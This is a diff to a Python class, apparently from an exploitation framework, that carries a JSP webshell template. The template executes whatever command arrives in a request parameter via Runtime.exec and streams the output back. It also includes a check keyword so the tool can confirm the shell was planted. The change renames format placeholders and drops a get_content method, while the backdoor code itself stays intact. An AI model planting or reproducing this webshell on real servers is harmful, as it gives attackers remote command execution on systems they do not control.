@@ -8,9 +8,9 @@ class JspShell(Webshell):
                '<%\n' \
                'if (request.getParameter("check") == "1")\n' \
                '    out.println("00799a96dcc29282dd74e23e49b647aa");\n' \
-               'if (request.getParameter("{0}") != null)\n' \
+               'if (request.getParameter("{pwd}") != null)\n' \
                '{{\n' \
-               '    Process p = Runtime.getRuntime().exec(request.getParameter("{1}"));\n' \
+               '    Process p = Runtime.getRuntime().exec(request.getParameter("{pwd}"));\n' \
                '    OutputStream os = p.getOutputStream();\n' \
                '    InputStream in = p.getInputStream();\n' \
                '    DataInputStream dis = new DataInputStream(in);\n' \
@@ -25,10 +25,6 @@ class JspShell(Webshell):
     _password = 'cmd'
     _check_data = {'check': '1'}
     _keyword = '00799a96dcc29282dd74e23e49b647aa'
-
-    def get_content(self):
-        return self._content.format(self._password, self._password)
-
 
 class JspVerify(VerifyShell):
     _content = '<%@ page import="java.util.*,java.io.*" %>\n' \
